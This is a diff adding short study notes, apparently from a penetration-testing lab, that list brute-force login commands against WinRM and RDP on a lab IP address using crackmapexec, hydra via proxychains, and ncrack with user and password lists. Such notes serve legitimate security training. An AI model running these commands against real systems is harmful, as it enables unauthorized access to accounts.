@@ -1,0 +1,15 @@
+BRUTE FORCE ATTACK
+	- After creating a custom password list
+	
+		WINRM: 
+			$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list --continue-on-fail --sleep 1
+				// adding delays 
+		
+			
+		HYDRA:
+			$ proxychains hydra -L user.list -P password.list -t 4 rdp://10.129.42.197
+			
+			
+		NCRACK
+			$ ncrack -U user.list -P password.list rdp://10.129.42.197
+			
